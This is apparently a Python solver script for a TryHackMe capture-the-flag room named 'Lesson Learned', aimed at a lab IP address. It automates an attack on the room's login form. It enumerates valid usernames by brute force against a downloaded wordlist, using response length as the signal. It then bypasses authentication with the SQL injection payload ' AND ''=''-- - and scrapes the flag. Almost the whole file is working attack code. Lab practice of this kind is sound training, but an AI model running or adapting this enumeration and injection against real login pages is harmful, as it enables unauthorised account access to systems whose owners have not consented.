import requests
import os
import re

def download_user_wordlist(path):
    url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/Names/names.txt"
    print(f"[*] Downloading user wordlist to: {path}...")
    response = requests.get(url)
    if response.status_code == 200:
        with open(path, "w") as f:
            f.write(response.text)
        print("[+] Wordlist downloaded successfully.")
    else:
        print("[-] Failed to download wordlist.")
        exit(1)

def solve_lesson_learned(task_name, target_ip):
    base_url = f"http://{target_ip}/"
    wordlist_path = "usernames_names.txt"
    log_dir = "logs"
    flags_dir = "flags"
    os.makedirs(log_dir, exist_ok=True)
    os.makedirs(flags_dir, exist_ok=True)

    log_file = os.path.join(log_dir, f"{task_name}.log")
    flag_file = os.path.join(flags_dir, f"{task_name}.flag")

    if not os.path.exists(wordlist_path):
        download_user_wordlist(wordlist_path)

    session = requests.Session()

    print("[*] Stage 1: Enumerating valid usernames...")
    valid_username = None
    with open(wordlist_path, "r") as f:
        for line in f:
            username = line.strip()
            if not username:
                continue
            payload = {"username": username, "password": "wrongpass"}
            response = session.post(base_url, data=payload)
            if len(response.text) != 1253:
                valid_username = username
                print(f"[+] Valid username found: {valid_username}")
                break

    if not valid_username:
        print("[-] No valid username found.")
        return None

    print("[*] Stage 2: Attempting login bypass via SQL Injection...")

    sqli_payload = f"{valid_username}' AND ''=''-- -"
    login_data = {"username": sqli_payload, "password": "x"}

    response = session.post(base_url, data=login_data)

    if "Invalid" in response.text or response.status_code != 200:
        print("[-] Login bypass failed.")
        return None

    print(f"[+] Logged in as: {valid_username}")
    print("[*] Stage 3: Searching for flag on the homepage...")

    flag_match = re.search(r"THM\{.*?\}", response.text)
    if flag_match:
        flag = flag_match.group(0)
        print(f"[✅] Flag found: {flag}")

        with open(log_file, "w") as log:
            log.write("[Lesson Learned Solver Log]\n")
            log.write(f"Target IP: {target_ip}\n")
            log.write(f"Valid username: {valid_username}\n")
            log.write(f"SQLi payload: {sqli_payload}\n")
            log.write(f"Flag: {flag}\n")

        with open(flag_file, "w") as f:
            f.write(flag + "\n")

        return flag
    else:
        print("[-] Flag not found on the homepage.")
        print("[debug] Partial HTML preview:\n", response.text[:1000])
        return None

# Local test
if __name__ == "__main__":
    solve_lesson_learned("Lesson_Learned", "10.10.111.158")
